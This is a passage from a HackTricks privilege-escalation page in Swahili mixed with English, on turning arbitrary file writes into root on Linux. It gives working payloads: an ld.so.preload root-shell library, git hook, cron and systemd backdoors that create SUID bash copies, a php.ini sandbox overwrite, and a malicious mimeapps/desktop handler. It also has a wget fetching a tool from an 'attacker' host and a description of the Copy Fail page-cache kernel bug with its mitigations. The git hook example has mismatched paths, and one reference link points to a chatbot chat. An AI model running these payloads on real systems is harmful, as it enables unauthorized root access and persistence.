# Uandishi wa Faili Nasibu hadi Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii hufanya kazi kama variable ya mazingira ya **`LD_PRELOAD`** lakini pia hufanya kazi katika **SUID binaries**.\
Ikiwa unaweza kuiunda au kuibadilisha, unaweza tu kuongeza **path ya library itakayopakiwa** na kila binary inayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **huendeshwa** kwenye matukio mbalimbali **events** ndani ya git repository kama commit inapotengenezwa, merge... Kwa hiyo ikiwa **privileged script or user** inafanya hii actions mara kwa mara na inawezekana **kuandika ndani ya `.git` folder**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, Inawezekana **kutengeneza script** ndani ya git repo katika **`.git/hooks`** ili iwe daima **inaendeshwa** commit mpya inapotengenezwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Ikiwa unaweza **kuandika cron-related files ambazo root inatekeleza**, kwa kawaida unaweza kupata code execution wakati ujao job itakapokimbia. Malengo ya kuvutia ni pamoja na:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- `systemd` timers na services wanazozianzisha

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Ongeza root cron job mpya** kwenye `/etc/crontab` au faili ndani ya `/etc/cron.d/`
- **Badilisha script** ambayo tayari inatekelezwa na `run-parts`
- **Weka backdoor kwenye timer target iliyopo** kwa kubadilisha script au binary inayoizindua

Mfano mdogo wa cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, badala yake weka faili inayotekelezeka hapo:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` kawaida hupuuza filenames zenye dots, hivyo pendelea majina kama `backup` badala ya `backup.sh`.
- Baadhi ya distros hutumia `anacron` au `systemd` timers badala ya classic cron, lakini wazo la abuse ni lilelile: **modify what root will execute later**.

### Service & Socket files

Ukiweza kuandika **`systemd` unit files** au files zinazoreferwa nazo, unaweza kupata code execution kama root kwa kufanya reload na restart ya unit, au kwa kusubiri service/socket activation path ichochewe.

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Andika upya `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kubadili
- **Ongeza drop-in override** yenye `ExecStart=` yenye nia mbaya na kwanza ondoa ile ya zamani
- **Backdoor script/binary** ambayo tayari inareferiwa na unit
- **Hijack socket-activated service** kwa kubadili faili ya `.service` inayolingana ambayo huanza socket inapopokea connection

Mfano wa malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa uanzishaji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha upya services wewe mwenyewe lakini unaweza kuhariri socket-activated unit, unaweza kuhitaji tu **kusubiri client connection** ili kuanzisha execution ya service iliyobackdooriwa kama root.

### Andika upya `php.ini` yenye vizuizi inayotumiwa na privileged PHP sandbox

Baadhi ya custom daemons huvalidate PHP inayotolewa na user kwa kuendesha `php` na **restricted `php.ini`** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code ya sandbox bado ina **any write primitive** (kama `file_put_contents`) na unaweza kufikia **exact `php.ini` path** inayotumiwa na daemon, unaweza **kuoverwrite config hiyo** ili kuondoa restrictions kisha uwasilishe second payload inayotekelezwa na elevated privileges.

Typical flow:

1. First payload ina-overwrite sandbox config.
2. Second payload inatekeleza code sasa kwa kuwa dangerous functions zimewashwa tena.

Minimal example (badilisha path inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa root-owned paths), utekelezaji wa pili unatoa root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.

### binfmt_misc

File iliyo katika `/proc/sys/fs/binfmt_misc` inaonyesha binary gani inapaswa kutekeleza aina gani ya files. TODO: angalia requirements za kutumia hii ili kutekeleza rev shell wakati common file type inafunguliwa.

### Overwrite schema handlers (like http: or https:)

Attacker mwenye write permissions kwenye configuration directories za victim anaweza kirahisi kubadilisha au kuunda files zinazochange system behavior, na hivyo kusababisha unintended code execution. Kwa kurekebisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (mfano, kuweka `x-scheme-handler/http=evil.desktop`), attacker anahakikisha kwamba **kubofya link yoyote ya http au https kunachochea code iliyobainishwa kwenye file hiyo ya `evil.desktop`**. Kwa mfano, baada ya kuweka code hasidi ifuatayo kwenye `evil.desktop` katika `$HOME/.local/share/applications`, kubofya URL yoyote ya nje huendesha command iliyopachikwa:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa maelezo zaidi angalia [**posti hii**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumika ku-exploit vulnerability halisi.

### Root executing user-writable scripts/binaries

Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na unprivileged user), unaweza ku-hijack:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na directory yake zote zinamilikiwa/zinazoruhusiwa kuandikwa na user wako.
- **Chukua udhibiti wa lengwa:** hifadhi nakala ya binary/script ya asili na weka payload inayounda SUID shell (au hatua nyingine yoyote ya root), kisha rudisha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.

### Ubadilishaji wa faili wa page-cache pekee wa binaries zenye privilege

Baadhi ya kernel bugs hazibadilishi faili **kwenye disk**. Badala yake, zinaruhusu ubadilishe tu **nakala ya page cache** ya faili inayoweza kusomwa. Ikiwa unaweza kulenga **setuid** au nyingine **root-executed** binary, utekelezaji unaofuata unaweza kuendesha bytes zilizodhibitiwa na attacker kutoka memory na kuongeza privileges hata kama hash ya faili kwenye disk haijabadilika.

Hii ni muhimu kuifikiria kama **runtime-only file write primitive**:

- **Disk inabaki safi**: inode na bytes za kwenye disk hazibadiliki
- **Memory ni chafu**: processes zinazosoma/kuendesha page iliyohifadhiwa hupata content iliyobadilishwa na attacker
- **Athari ni ya muda**: mabadiliko yanatoweka baada ya reboot au cache eviction

Hii primitive ipo kati ya classic **arbitrary file write** na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na constraints za write-position
- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa writes za moja kwa moja kwenye cached file-backed pages

#### Generic privesc flow

1. Pata kernel primitive inayoweza kuandika ndani ya **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au faili lingine linaloendeshwa na root
3. Anzisha execution **kabla** page haijatolewa kutoka cache
4. Pata code execution kama root huku file ya kwenye disk bado inaonekana haijabadilishwa

Typical high-value targets:

- **setuid-root** binaries
- Helpers wanaozinduliwa na **root services**
- Binaries zinazotekelezwa mara kwa mara kutoka **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) ni mfano mzuri wa daraja hili. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` inaweza kuhamisha references za page-cache pages kutoka faili inayoweza kusomwa kwenda kwenye crypto TX scatterlist
- in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha ikaandika kwenye destination tag region
- wakati eneo hilo bado lilikuwa linarejea spliced file-backed pages, write ilitua kwenye **page cache ya faili lengwa**

Kwa hiyo technique ya kuvutia si CVE yenyewe, bali pattern:

- **ingiza file-backed cache pages ndani ya kernel subsystem**
- fanya subsystem **iziendee kama writable output**
- anzisha overwrite ndogo iliyodhibitiwa kwenye memory

Public PoC ilitumia kurudia **4-byte writes** kubandika `/usr/bin/su` kwenye memory kisha ikaitekeleza.

#### Exposure and hunting

Ikiwa unashuku daraja hili la bug, usitegemee tu disk integrity checks. Pia hakikisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kushushwa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- setuid binaries ni malengo mazuri kwa sababu patch ya page-cache-only inaweza kuwa ya kutosha kugeuza local foothold kuwa root

#### Kupunguza attack-surface kwa njia ya `algif_aead`

Ikiwa vulnerable interface imetolewa na loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa imejumuishwa kwenye kernel, baadhi ya disclosures ziliripoti kuzuia init path kwa:
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation pia inafaa kukumbuka kwa kernel LPEs nyingine: ikiwa exploitation inategemea interface mahususi ya hiari, kuzima au kuweka kwenye blacklist interface hiyo kunaweza kuvunja exploit path hata kabla ya full kernel upgrade kupatikana.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
